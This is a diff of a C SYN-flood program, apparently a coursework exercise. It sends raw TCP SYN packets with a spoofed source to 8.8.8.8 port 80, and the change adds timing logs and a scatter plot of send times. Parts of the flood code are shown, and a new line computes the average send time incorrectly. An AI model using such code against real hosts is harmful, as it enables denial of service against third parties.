@@ -8,13 +8,15 @@
 #include <netinet/tcp.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include "pbPlots.h"
+#include "supportLib.h"
 
 #define SRC_ADDR "127.0.0.1"
 
 #define DEST_ADDR "8.8.8.8"
 #define DEST_PORT 80
 
-#define NUM_SYN_REQ 100
+#define NUM_SYN_REQ 10
 
 // Create the IP header
 void setIpHeader(struct iphdr *ip_header);
@@ -105,7 +107,10 @@ void pseudoHeaderTcpChecksum(struct iphdr *ip_header, struct tcphdr *tcp_header)
 
 int main() {
 
+    double x[NUM_SYN_REQ]; // Axis for the time of sending packet
+    double y[NUM_SYN_REQ]; // Axis of the packets numbers
 
+    RGBABitmapImageReference *imageref = CreateRGBABitmapImageReference(); // Create image reference
 
     // Create a raw socket
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -173,10 +178,32 @@ int main() {
         fprintf(file, "Syn request number %d was sent.\n", i);
         fprintf(file, "Time of sending: %ld.%ld seconds.\n\n", (end_send.tv_sec-start_send.tv_sec), (end_send.tv_usec-start_send.tv_usec));
         attackTime += ((end_send.tv_sec*1000000 + end_send.tv_usec) - (start_send.tv_sec*1000000 + start_send.tv_usec)); // Calculate the all time
+
+        // Add the packet number and time sending it to the axises
+        x[i] = ((end_send.tv_sec*1000000 + end_send.tv_usec) - (start_send.tv_sec*1000000 + start_send.tv_usec));
+        y[i] = i;
     }
 
     fprintf(file, "Attack time: %d seconds\n", attackTime / 1000000);
-    fprintf(file, "Average time for sending packet: %d\n", attackTime / NUM_SYN_REQ);
+    fprintf(file, "Average time for sending packet: %d.%d\n", attackTime / 1000000, attackTime / NUM_SYN_REQ);
+
+
+    StringReference *errormessage = CreateStringReference(L"", 0);
+    // Set the image 
+    bool success = DrawScatterPlot(imageref, 800, 600, x, NUM_SYN_REQ, y, NUM_SYN_REQ, errormessage);
+   
+    if(success) {
+        // Convert the data to png image
+        size_t length;
+        double *pngdata = ConvertToPNG(&length, imageref->image);
+        WriteToFile(pngdata, length, "Syn_pkts_c.png");
+        DeleteImage(imageref->image);
+    } else {
+        printf("DrawScatterPlot() failed\n");
+        return 1;
+    }
+    FreeAllocations();
+
 
     fclose(file);
     close(sock);
